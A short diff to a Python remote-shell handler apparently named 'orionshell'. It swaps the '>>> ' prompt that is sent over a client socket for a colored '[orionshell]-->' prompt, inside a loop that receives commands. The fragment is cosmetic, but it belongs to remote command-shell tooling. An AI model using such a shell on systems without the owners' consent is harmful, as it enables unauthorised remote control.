@@ -28,8 +28,10 @@ def shell(client_socket):
     output_thread.start()
 
     while True:
+        prompt = f"\033[96m[orionshell]--> "
+        prompt = prompt.encode('ASCII')
         time.sleep(0.2)
-        client_socket.send(b">>> ")
+        client_socket.send(prompt)
         command = client_socket.recv(1024).decode("utf-8")
         if command.lower() == "exit":
             stop_flag.set() 
